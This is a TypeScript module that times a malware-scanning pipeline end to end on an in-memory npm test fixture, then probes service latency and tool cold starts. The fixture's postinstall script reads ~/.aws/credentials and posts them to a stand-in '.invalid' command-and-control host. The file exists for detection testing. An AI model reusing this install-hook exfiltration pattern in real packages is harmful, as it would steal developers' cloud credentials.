/**
 * Operator pipeline timing (part of POST /api/ops/smoke, Preview only).
 *
 * Runs the production orchestrator (`runScan`) end to end on OUR OWN phone-home
 * fixture (the same four files as github.com/AIdhirajSingh/cr-fixture-phone-home,
 * built in memory, never fetched): real E2B VMs from the template (detonation and
 * analysis, early boot, forge, fence, containment probe, canaries), real Jev on AI
 * Gateway, real Luna. Two things differ from a public scan, both so the smoke
 * scans no repository and writes nothing: the target is an operator tarball
 * served from memory, and the store is a no-op (nothing persisted, no cache, no
 * budget row). The response reports the stage timings, the time the result was
 * ready, and the verdict facts, so speed is measured on the real path.
 *
 * Also here: round-trip probes from this function to the services a scan talks
 * to (the v2 database pooler, E2B, OpenAI, GitHub, npm, AI Gateway), and a Luna
 * latency probe per reasoning effort on the fixture's own facts.
 */

import { createHash } from "node:crypto";
import type { EngineConfig, ReasoningEffort } from "../engine/config";
import { productionDeps } from "../engine/deps";
import { writeReport, type WriterInput } from "../engine/model/writer";
import { OpenAIAdapter } from "../engine/model/openai";
import { runScan, type EngineDeps } from "../engine/orchestrator";
import { packFiles } from "../engine/sandbox/pack";
import type { SandboxProvider } from "../engine/sandbox/provider";
import { v2Executor, type CachedRun, type ClaimResult, type ScanStore } from "../engine/store";
import type { ReportPayload, ScanEvent, ScanRequest, Verdict } from "../engine/types";

const enc = new TextEncoder();

/** The phone-home fixture: reads the planted decoy AWS credentials at install and posts them to a reserved .invalid host. */
export function phoneHomeFixture(): Map<string, Uint8Array> {
  const files = new Map<string, Uint8Array>();
  files.set(
    "package/package.json",
    enc.encode(
      JSON.stringify(
        {
          name: "cr-fixture-phone-home",
          version: "1.0.0",
          description: "ClaudeRabbit test fixture: reads a planted decoy credential at install and posts it to a reserved .invalid host.",
          main: "index.js",
          scripts: { postinstall: "node install.js" },
          license: "MIT",
        },
        null,
        2,
      ) + "\n",
    ),
  );
  files.set(
    "package/install.js",
    enc.encode(
      [
        "// ClaudeRabbit test fixture. Reads the sandbox's planted decoy credential and",
        "// posts it to a reserved .invalid host.",
        'const fs = require("fs");',
        'const os = require("os");',
        'const path = require("path");',
        'const https = require("https");',
        'let creds = "";',
        "try {",
        '  creds = fs.readFileSync(path.join(os.homedir(), ".aws", "credentials"), "utf8");',
        "} catch (_) {",
        '  creds = "";',
        "}",
        "try {",
        "  const body = JSON.stringify({ host: os.hostname(), aws: creds });",
        "  const req = https.request(",
        '    { host: "c2.cr-fixture.invalid", path: "/collect", method: "POST", headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) }, timeout: 5000 },',
        "    (res) => res.resume(),",
        "  );",
        '  req.on("error", () => {});',
        '  req.on("timeout", () => req.destroy());',
        "  req.end(body);",
        "} catch (_) {}",
        "",
      ].join("\n"),
    ),
  );
  files.set("package/index.js", enc.encode("module.exports = function add(a, b) {\n  return a + b;\n};\n"));
  files.set("package/README.md", enc.encode("# cr-fixture-phone-home\n\nClaudeRabbit test fixture. Harmless: the host is a reserved .invalid name.\n"));
  return files;
}

export const FIXTURE_URL = "https://fixture.clauderabbit.invalid/cr-fixture-phone-home-1.0.0.tgz";

/** A store that persists nothing: the smoke must not touch v2 rows, the SHA cache or the budget. */
export class NullStore implements ScanStore {
  saved = 0;
  readonly ownerCache = { get: async () => null, put: async () => undefined };
  async findCached(): Promise<CachedRun | null> {
    return null;
  }
  async claimRun(req: { runId: string }): Promise<ClaimResult> {
    return { status: "claimed", runId: req.runId };
  }
  async appendEvents(): Promise<void> {}
  async saveReport(): Promise<void> {
    this.saved++;
  }
  async finishRun(): Promise<void> {}
  async chargeBudget(): Promise<boolean> {
    return true;
  }
}

export interface PipelineTiming {
  ok: boolean;
  error: string | null;
  /** ms from runScan start to the returned report (what a client waits for). */
  result_ms: number;
  /** ms until the background persist task settled. */
  settled_ms: number;
  /** First time (ms) each stage reached each status, from the event stream. */
  stages: Record<string, Record<string, number>>;
  timings: Record<string, number>;
  verdict: Verdict | null;
  score: number | null;
  writer: string | null;
  forged_calls: Array<{ host: string; method?: string; canary_hits: string[] }>;
  decoy_reads: string[];
  checks: Array<{ name: string; ok: boolean; detail?: string }>;
  not_verified: string[];
  cost: unknown;
  report: ReportPayload | null;
}

/** Model and network seams; production uses productionDeps (tests pass stand-ins). */
export type PipelineEngine = Pick<EngineDeps, "jev" | "luna" | "fetch">;

export async function runPipelineTiming(config: EngineConfig, provider: SandboxProvider, now: () => number = () => Date.now(), engine?: PipelineEngine): Promise<PipelineTiming> {
  const tgz = packFiles(phoneHomeFixture());
  const integrity = `sha512-${createHash("sha512").update(tgz).digest("base64")}`;
  const base: PipelineEngine = engine ?? productionDeps(config, new NullStore());
  const realFetch = base.fetch;
  const fixtureFetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    if (url === FIXTURE_URL) return new Response(new Uint8Array(tgz), { status: 200, headers: { "content-type": "application/gzip" } });
    return realFetch(input, init);
  }) as typeof fetch;
  const store = new NullStore();
  const deps: EngineDeps = { jev: base.jev, luna: base.luna, sandbox: provider, store, fetch: fixtureFetch, now, config };
  const req: ScanRequest = {
    target: { kind: "tarball", url: FIXTURE_URL, integrity, label: "cr-fixture-phone-home" },
    caller: { surface: "web", userId: null, ip: null, deviceId: null, operator: true },
    regenerate: true,
  };
  const t0 = now();
  const stages: PipelineTiming["stages"] = {};
  const checks: PipelineTiming["checks"] = [];
  const onEvent = (e: ScanEvent) => {
    const t = Math.round(now() - t0);
    if (e.type === "stage") {
      const s = (stages[e.data.name] ??= {});
      if (s[e.data.status] === undefined) s[e.data.status] = t;
    } else if (e.type === "check") {
      checks.push({ name: e.data.name, ok: e.data.ok, ...(e.data.detail ? { detail: e.data.detail.slice(0, 300) } : {}) });
    }
  };
  const tasks: Promise<void>[] = [];
  try {
    const out = await runScan(req, deps, { onEvent, background: (t) => void tasks.push(t) });
    const resultMs = Math.round(now() - t0);
    await Promise.allSettled(tasks);
    const settledMs = Math.round(now() - t0);
    if (out.kind !== "fresh") {
      return { ok: false, error: out.kind === "error" ? `${out.code}: ${out.message}` : `unexpected ${out.kind}`, result_ms: resultMs, settled_ms: settledMs, stages, timings: {}, verdict: null, score: null, writer: null, forged_calls: [], decoy_reads: [], checks, not_verified: [], cost: null, report: null };
    }
    const r = out.report;
    const f = r.forensics as { forged_calls?: Array<{ host: string; method?: string; canary_hits?: string[] }>; files?: Array<{ op: string; path: string }> };
    return {
      ok: true,
      error: null,
      result_ms: resultMs,
      settled_ms: settledMs,
      stages,
      timings: r.timings,
      verdict: r.verdict,
      score: r.score,
      writer: r.writer ?? null,
      forged_calls: (f.forged_calls ?? []).map((c) => ({ host: c.host, ...(c.method ? { method: c.method } : {}), canary_hits: c.canary_hits ?? [] })),
      decoy_reads: (f.files ?? []).filter((x) => x.op === "read_decoy").map((x) => x.path),
      checks,
      not_verified: r.not_verified,
      cost: r.cost ?? null,
      report: r,
    };
  } catch (err) {
    return { ok: false, error: err instanceof Error ? err.message : String(err), result_ms: Math.round(now() - t0), settled_ms: Math.round(now() - t0), stages, timings: {}, verdict: null, score: null, writer: null, forged_calls: [], decoy_reads: [], checks, not_verified: [], cost: null, report: null };
  }
}

/** Luna's one call on the fixture's own facts, once per reasoning effort, timed. */
export async function probeLuna(config: EngineConfig, report: ReportPayload, efforts: ReasoningEffort[], now: () => number = () => Date.now()) {
  const forensics = report.forensics as { coverage?: { failed?: string[] }; forensic_coverage?: { coverage?: string }; install?: string };
  const sandbox: WriterInput["sandbox"] =
    forensics.install !== "completed" || forensics.forensic_coverage?.coverage === "lost" ? "not_observed" : forensics.forensic_coverage?.coverage === "complete" ? "observed" : "partial";
  const input: WriterInput = { target: report.target, score: report.score, verdict: report.verdict, breakdown: report.breakdown, notVerified: report.not_verified, checkAnswers: [], statedPurpose: "ClaudeRabbit test fixture.", sandbox };
  const out: Array<{ effort: ReasoningEffort; ms: number; writer: string; output_tokens: number; input_tokens: number; cached_input_tokens: number; errors: string[]; rejections: string[][] }> = [];
  for (const effort of efforts) {
    const luna = new OpenAIAdapter({ apiKey: config.openaiApiKey!, modelId: config.modelId, reasoningEffort: effort });
    const t = now();
    const w = await writeReport(luna, input, AbortSignal.timeout(config.deadlines.writerMs));
    out.push({ effort, ms: Math.round(now() - t), writer: w.writer, output_tokens: w.usage.outputTokens, input_tokens: w.usage.inputTokens, cached_input_tokens: w.usage.cachedInputTokens, errors: w.errors.map((e) => e.slice(0, 200)), rejections: w.rejections });
  }
  return out;
}

async function timeIt(fn: () => Promise<unknown>, now: () => number): Promise<number | string> {
  const t = now();
  try {
    await fn();
    return Math.round(now() - t);
  } catch (err) {
    return `error after ${Math.round(now() - t)} ms: ${(err instanceof Error ? err.message : String(err)).slice(0, 120)}`;
  }
}

/** Sequential round trips from this function to each service a scan uses (first one includes connection setup). */
export async function probeNetwork(config: EngineConfig, now: () => number = () => Date.now(), rounds = 3) {
  const http = (url: string, method = "GET") => async () => {
    const r = await fetch(url, { method, redirect: "manual", signal: AbortSignal.timeout(8_000), headers: { "User-Agent": "clauderabbit-ops-smoke" } });
    await r.body?.cancel();
  };
  const targets: Record<string, () => Promise<unknown>> = {
    e2b_api: http("https://api.e2b.app/health"),
    openai_api: http("https://api.openai.com/v1/models"),
    github_api: http("https://api.github.com/"),
    npm_registry: http("https://registry.npmjs.org/-/ping"),
    ai_gateway: http("https://ai-gateway.vercel.sh/v1/models", "HEAD"),
  };
  if (config.databaseUrl) {
    const db = v2Executor(config);
    targets.v2_db_pooler = () => db.query("select 1 as one");
  }
  const result: Record<string, Array<number | string>> = {};
  for (const [name, fn] of Object.entries(targets)) {
    result[name] = [];
    for (let i = 0; i < rounds; i++) result[name].push(await timeIt(fn, now));
  }
  return { region: process.env.VERCEL_REGION ?? null, rounds: result };
}

/**
 * Cold versus warm start of the tools a scan runs, in fresh VMs from the
 * template (no network, no repo code; the commands scan our own rule files).
 * VM A runs each tool twice (cold, then warm page cache); VM B first reads the
 * tools' files into the page cache, then runs each once. The gap between "cold"
 * and "after_prefetch" is what a prefetch at boot can save.
 */
export const COLDSTART_SCRIPT = [
  "set -u",
  "export PATH=/opt/cr/node/bin:/opt/cr/tools/bin:/usr/bin:/bin SEMGREP_SEND_METRICS=off SEMGREP_ENABLE_VERSION_CHECK=0",
  "t() { s=$(date +%s%3N); \"$@\" >/dev/null 2>&1; echo $(( $(date +%s%3N) - s )); }",
  "sg() { semgrep scan --config /opt/cr/rules/semgrep --json --metrics=off --disable-version-check --jobs 1 /opt/cr/forge; }",
  "gd() { guarddog npm scan /opt/cr/forge --output-format=json; }",
  "yx() { /opt/cr/venv/bin/python /opt/cr/bin/cr-yara.py /opt/cr/rules/yara /opt/cr/forge; }",
  "mi() { mitmdump --version; }",
  "np() { npm --version; }",
  "pf() { find /opt/cr/tools/uv /opt/cr/node /opt/cr/venv /usr/lib/python3.12 -type f -print0 | xargs -0 cat >/dev/null; }",
  "if [ \"${1:-}\" = prefetch ]; then echo \"prefetch_ms=$(t pf)\"; echo \"prefetch_mb=$(du -scm /opt/cr/tools/uv /opt/cr/node /opt/cr/venv /usr/lib/python3.12 | tail -n1 | cut -f1)\"; fi",
  "for f in sg gd yx mi np; do echo \"${f}_1=$(t $f)\"; echo \"${f}_2=$(t $f)\"; done",
].join("\n");

export async function probeColdStart(provider: SandboxProvider, runId: string, now: () => number = () => Date.now()) {
  const { withSandbox } = await import("../engine/sandbox/provider");
  const one = (mode: "plain" | "prefetch") =>
    withSandbox(provider, { purpose: "analyze", runId: `${runId}-cold-${mode}`, timeoutMs: 180_000, network: "none" }, async (s) => {
      await s.writeFile("/root/coldstart.sh", COLDSTART_SCRIPT);
      const t = now();
      const r = await s.run(`bash /root/coldstart.sh ${mode === "prefetch" ? "prefetch" : ""}`, { timeoutMs: 170_000 });
      const values: Record<string, number> = {};
      for (const m of r.stdout.matchAll(/^([a-z_0-9]+)=(\d+)$/gm)) values[m[1]!] = Number(m[2]);
      return { mode, exit: r.exitCode, wall_ms: Math.round(now() - t), values, stderr: r.stderr.slice(-300) };
    });
  return Promise.all([one("plain"), one("prefetch")]);
}
